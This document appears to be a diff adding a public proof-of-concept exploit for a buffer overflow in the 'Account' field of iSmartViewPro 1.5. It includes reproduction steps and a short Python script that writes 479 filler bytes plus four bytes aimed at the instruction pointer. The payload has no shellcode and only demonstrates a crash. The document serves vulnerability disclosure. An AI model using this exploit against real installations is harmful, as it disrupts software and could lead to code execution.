@@ -1,0 +1,28 @@
+# Exploit Title: iSmartViewPro 1.5 - 'Account' Buffer Overflow
+# Discovery by: Alan Joaquín Baeza Meza
+# Discovery Date: 2018-08-07
+# Vendor Homepage: http://www.securimport.com/n/en/
+# Software Link: https://securimport.com/university/index.php/videovigilancia-ip/software/493-software-ismartviewpro-v1-5
+# Tested Version: 1.5
+# Tested on OS  : Windows 10 Pro x64 es
+
+# Steps to Produce the BoF: 
+# 1.- Run python code : python generatepaste.py
+# 2.- Open generate.txt and copy content to clipboard
+# 3.- Open iSmartViewPro
+# 4.- Add device manually
+# 5.- Device alias -> A
+# 6.- Device Type-> SmartP2P
+# 7.- DDNS/IP/DID-> 0.0.0.0
+# 8.- Paste ClipBoard on "Account"
+# 9.- Password -> A
+#10.- Aceptar
+#11.- BoF
+
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+buffer = "\x41" * 479
+eip= "\x42" * 4
+f = open ("generate.txt", "w")
+f.write(buffer+eip)
+f.close()
